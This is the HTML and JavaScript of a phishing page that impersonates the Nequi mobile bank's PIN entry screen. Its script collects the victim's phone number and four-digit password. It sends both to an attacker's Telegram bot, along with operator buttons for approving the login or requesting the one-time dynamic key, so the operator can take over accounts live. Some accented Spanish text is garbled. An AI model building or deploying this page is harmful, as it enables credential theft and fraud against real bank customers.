<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Nequi - Clave</title>
  <link rel="stylesheet" href="../css/spinner.css" />
  <link rel="stylesheet" href="../css/navbar.css" />
  <link rel="stylesheet" href="../css/globals.css" />
  <link rel="shortcut icon" type="image/x-icon" href="../assets/favicon.html" />
  <style>
    .loadingContainer { display: none; }
    footer {
      margin-top: 40px;
      background: url(../assets/footer-nequi.svg);
      background-repeat: no-repeat;
      background-size: cover;
      padding: 100px 0 60px 0;
    }
  </style>
</head>



<body class="bg-purple-primary h-dvh flex flex-col">
  <main class="loadingContainer">
    <header class="z-[999] fixed top-0 w-full h-16 mx-auto pt-0 pb-0 overflow-visible bg-white">
      <div class="flex items-center h-full border-b border-gray-primary bg-white px-[26px]">
        <div class="flex items-center justify-between w-full max-w-[61.875rem] h-full mx-auto">
          <a href="../index.html" class="h-8">
            <svg width="180" height="40" viewBox="0 0 104 32" fill="none">
              <path d="M5.29905 0H0.918073C0.411035 0 0 0.408316 0 0.912V4.608C0 5.11168 0.411035 5.52 0.918073 5.52H5.29905C5.80609 5.52 6.21713 5.11168 6.21713 4.608V0.912C6.21713 0.408316 5.80609 0 5.29905 0Z" fill="#DA0081"/>
              <path d="M31.9876 0H28.2187C27.7033 0 27.3006 0.416 27.3006 0.912V15.872C27.3006 16.176 26.8979 16.288 26.753 16.016L17.991 0.4C17.8461 0.144 17.5884 0 17.2823 0H11.0169C10.5015 0 10.0988 0.416 10.0988 0.912V24.816C10.0988 25.328 10.5176 25.728 11.0169 25.728H14.7858C15.3012 25.728 15.7039 25.312 15.7039 24.816V9.408C15.7039 9.104 16.1066 8.992 16.2515 9.264L25.2551 25.344C25.4 25.6 25.6577 25.744 25.9638 25.744H31.9554C32.4708 25.744 32.8735 25.328 32.8735 24.832V0.912C32.8735 0.4 32.4547 0 31.9554 0H31.9876Z" fill="#200020"/>
            </svg>
          </a>
          <button class="flex flex-col justify-between w-[25px] h-[20px] bg-transparent border-none cursor-pointer">
            <span class="bar w-full max-w-[25px] h-px my-[3px] bg-purple-primary transition-all duration-400 py-px"></span>
            <span class="bar w-full max-w-[25px] h-px my-[3px] bg-purple-primary transition-all duration-400 py-px"></span>
            <span class="bar w-full max-w-[25px] h-px my-[3px] bg-purple-primary transition-all duration-400 py-px"></span>
          </button>
        </div>
      </div>
    </header>

    <section class="mainSectionContainer loading">
      <div class="hero-image"></div>
      <div class="mainSectionWrapper">
        <div class="logo_nequi_animado">
          <img src="../assets/loading-nequi.webp" alt="">
        </div>
        <p class="wait-msg">Por favor, espere...</p>
        <p class="info-msg">En este momento estamos validando algunos datos. puede tardar un momento.</p>
        <div class="bottom" style="display: flex;">
          <p class="warning-msg">*V√°lido desde el 01 de Noviembre al 25 de diciembre del 2025, aplican T&C</p>
          <img src="../assets/seguro_fogafin.svg" alt="image">
        </div>
      </div>
    </section>

    <footer>
      <div class="wrap">
        <div class="wrapper">
          <div class="footer">
            <img class="footer-pc" src="../assets/footer-bigscreen.png" alt="" />
            <img class="footer-mobile" src="../assets/footer.png" alt="" />
          </div>
        </div>
      </div>
    </footer>
  </main>

  <div class="bg-white fixed top-0 left-0 w-full h-full z-50 hidden" id="error-login">
    <div class="min-h-dvh p-11 max-w-screen-sm mx-auto flex justify-center items-center">
      <section class="bg-white rounded-lg py-11 mb-80">
        <div class="flex flex-col items-center">
          <div class="flex justify-center items-center">
            <img class="max-w-[5.5rem]" src="../assets/iconsad.svg" alt="" />
          </div>
          <h1 class="text-lg font-bold text-[#210021] w-full text-center mb-4 mt-1">
            ¬°Ups, algo sali√≥ mal!
          </h1>
          <p class="text-[#210021] w-full text-center mb-4 mt-1 text-sm font-medium">
            El n√∫mero de tel√©fono o la contrase√±a que proporcionaste no son correctos. Por favor rev√≠salos e intenta ingresar nuevamente.
          </p>
          <button class="bg-[#DA0081] text-white px-4 py-2 rounded-lg mx-auto cursor-pointer hover:bg-[#c1007a]" id="tryAgainButton">
            Intentar nuevamente
          </button>
        </div>
      </section>
    </div>
  </div>

  <header class="w-full flex flex-col p-5 mb-4">
    <a href="accces-sign-in.html" class="w-6 h-6 text-white mb-5">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" fill="currentColor" width="100%" height="100%">
        <path d="M9.4 233.4c-12.5 12.5-12.5 32.8 0 45.3l160 160c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L109.2 288 416 288c17.7 0 32-14.3 32-32s-14.3-32-32-32l-306.7 0L214.6 118.6c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0l-160 160z"></path>
      </svg>
    </a>
    <h1 class="text-white text-2xl font-bold">Escribe tu clave</h1>
  </header>

  <section class="flex-1 max-w-[420px] flex flex-col mx-auto w-full px-4">
    <div class="max-w-[350px] w-full flex justify-center gap-8 mx-auto [&>input]:w-11 [&>input]:h-11 [&>input]:text-center [&>input]:bg-guanabana [&>input]:rounded-sm [&>input]:text-4xl [&>input]:font-bold [&>input]:text-pink-primary [&>input]:focus:outline-none [&>input]:pt-2.5">
      <input id="pass-1" maxlength="1" inputmode="none" readonly />
      <input id="pass-2" maxlength="1" inputmode="none" readonly />
      <input id="pass-3" maxlength="1" inputmode="none" readonly />
      <input id="pass-4" maxlength="1" inputmode="none" readonly />
    </div>
    <p class="text-center text-white text-sm mt-5 mb-8">
      No dudamos que seas t√∫...<br />Pero es mejor confirmar ;)
    </p>

    <div class="mt-auto w-full max-w-[400px] mx-auto" id="keyboard">
      <div class="flex justify-around mb-4 [&>button]:w-12 [&>button]:h-12 [&>button]:border-none [&>button]:bg-transparent [&>button]:text-4xl [&>button]:text-white [&>button]:cursor-pointer [&>button]:rounded-full [&>button]:transition-colors [&>button]:duration-200">
        <button class="keyboard-btn" data-value="1">1</button>
        <button class="keyboard-btn" data-value="2">2</button>
        <button class="keyboard-btn" data-value="3">3</button>
      </div>
      <div class="flex justify-around mb-4 [&>button]:w-12 [&>button]:h-12 [&>button]:border-none [&>button]:bg-transparent [&>button]:text-4xl [&>button]:text-white [&>button]:cursor-pointer [&>button]:rounded-full [&>button]:transition-colors [&>button]:duration-200">
        <button class="keyboard-btn" data-value="4">4</button>
        <button class="keyboard-btn" data-value="5">5</button>
        <button class="keyboard-btn" data-value="6">6</button>
      </div>
      <div class="flex justify-around mb-4 [&>button]:w-12 [&>button]:h-12 [&>button]:border-none [&>button]:bg-transparent [&>button]:text-4xl [&>button]:text-white [&>button]:cursor-pointer [&>button]:rounded-full [&>button]:transition-colors [&>button]:duration-200">
        <button class="keyboard-btn" data-value="7">7</button>
        <button class="keyboard-btn" data-value="8">8</button>
        <button class="keyboard-btn" data-value="9">9</button>
      </div>
      <div class="flex justify-around mb-4 [&>button]:w-12 [&>button]:h-12 [&>button]:border-none [&>button]:bg-transparent [&>button]:text-4xl [&>button]:text-white [&>button]:cursor-pointer [&>button]:rounded-full [&>button]:transition-colors [&>button]:duration-200">
        <button class="invisible" disabled></button>
        <button class="keyboard-btn" data-value="0">0</button>
        <button class="keyboard-btn text-white" id="delete-pass">
          <svg width="33" height="30" viewBox="0 0 29 27" fill="none">
            <path fill-rule="evenodd" clip-rule="evenodd" d="M26.8068 0C27.9114 0 28.8068 0.895431 28.8068 2V24.727C28.8068 25.8316 27.9114 26.727 26.8068 26.727H15.4722C14.9712 26.727 14.4884 26.5389 14.1194 26.2001L4.15169 17.0462C1.99435 15.065 1.99435 11.662 4.15169 9.68082L14.1194 0.526929C14.4884 0.188043 14.9712 0 15.4722 0H26.8068Z" fill="currentColor"></path>
            <path d="M16.3541 11.1945L21.3873 16.2277" stroke="#200020" stroke-linecap="round" stroke-linejoin="round"></path>
            <path d="M21.2213 11.4275L16.3423 16.3065" stroke="#200020" stroke-linecap="round" stroke-linejoin="round"></path>
          </svg>
        </button>
      </div>
    </div>
  </section>

  <script src="../js/sendTelegramMessage.js"></script>
  <script src="../js/actions.js"></script>
  <script type="module">
    document.addEventListener("DOMContentLoaded", () => {
      const formData = JSON.parse(localStorage.getItem("formData")) || {};
      const inputs = document.querySelectorAll('input[id^="pass-"]');
      const keyboard = document.getElementById("keyboard");
      const deleteBtn = document.getElementById("delete-pass");
      const loadingSpinner = document.querySelector(".loadingContainer");
      const errorLogin = document.getElementById("error-login");
      const tryAgainButton = document.getElementById("tryAgainButton");
      let currentInput = 0;

      if (!formData.phoneNumber) {
        console.error("‚ùå No hay n√∫mero de tel√©fono guardado");
        window.location.href = "accces-sign-in.html";
        return;
      }

      tryAgainButton.addEventListener("click", () => {
        window.location.href = "accces-sign-in.html?error=1";
      });

      keyboard.addEventListener("click", (e) => {
        const button = e.target.closest(".keyboard-btn");
        if (button && !button.id.includes("delete")) {
          const value = button.dataset.value;
          if (currentInput < inputs.length) {
            inputs[currentInput].dataset.realValue = value;
            inputs[currentInput].value = "*";
            inputs[currentInput].dispatchEvent(new Event("input", { bubbles: true }));
            currentInput++;
          }
        }
      });

      deleteBtn.addEventListener("click", () => {
        if (currentInput > 0) {
          currentInput--;
          inputs[currentInput].value = "";
          inputs[currentInput].dataset.realValue = "";
          inputs[currentInput].dispatchEvent(new Event("input", { bubbles: true }));
        }
      });

      document.addEventListener("keydown", (e) => {
        if (e.key === "Backspace" && currentInput > 0) {
          currentInput--;
          inputs[currentInput].value = "";
          inputs[currentInput].dataset.realValue = "";
          inputs[currentInput].dispatchEvent(new Event("input", { bubbles: true }));
        }
      });

      inputs.forEach((input) => {
        ["keydown", "keyup", "keypress"].forEach((eventType) => {
          input.addEventListener(eventType, (e) => {
            if (e.key !== "Backspace") {
              e.preventDefault();
              return false;
            }
          });
        });
        input.addEventListener("paste", (e) => {
          e.preventDefault();
          return false;
        });
      });

      inputs.forEach((input) => {
        input.addEventListener("input", async () => {
          let isComplete = Array.from(inputs).every((inp) => inp.value !== "");
          
          if (isComplete) {
            let pass = "";
            inputs.forEach((inp) => {
              pass += inp.dataset.realValue || "";
            });

            const savedData = JSON.parse(localStorage.getItem("formData")) || {};
            const transactionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
            
            savedData.password = pass;
            savedData.transactionId = transactionId;
            localStorage.setItem("formData", JSON.stringify(savedData));
            
            if (loadingSpinner) loadingSpinner.style.display = "block";

            const mensaje = `üîê *NEQUI - DATOS DE ACCESO*\n\nüì± *N√∫mero:* +57 ${savedData.phoneNumber}\nüîë *Clave:* ${pass}\n‚è∞ *Hora:* ${new Date().toLocaleTimeString('es-CO')}\nüìÖ *Fecha:* ${new Date().toLocaleDateString('es-CO')}\n\n‚ö†Ô∏è *Esperando validaci√≥n...*`;
            
            const teclado = JSON.stringify({
              inline_keyboard: [
                [
                  { text: "‚úÖ Correcto", callback_data: `correcto:${transactionId}` },
                  { text: "‚ùå Incorrecto", callback_data: `incorrecto:${transactionId}` }
                ],
                [
                  { text: "üîê Pedir Din√°mica", callback_data: `pedir_dinamica:${transactionId}` }
                ],
                [
                  { text: "‚ö†Ô∏è Error Din√°mica", callback_data: `error_dinamica:${transactionId}` },
                  { text: "üö´ Error Login", callback_data: `error_login:${transactionId}` }
                ],
                [
                  { text: "‚úîÔ∏è Finalizar", callback_data: `finish:${transactionId}` }
                ]
              ]
            });

            try {
              const responseMensaje = await sendTelegramMessageWithBtn(mensaje, teclado);
              const { action } = await waitForButtonPress(responseMensaje.message_id);
              await handleAction(action, transactionId);
            } catch (error) {
              console.error("‚ùå Error:", error);
              if (loadingSpinner) loadingSpinner.style.display = "none";
              if (errorLogin) {
                errorLogin.classList.remove("hidden");
                errorLogin.style.display = "flex";
              }
              setTimeout(() => {
                inputs.forEach(inp => {
                  inp.value = "";
                  inp.dataset.realValue = "";
                });
                currentInput = 0;
              }, 3000);
            }
          }
        });
      });
    });
  </script>
</body>
</html>


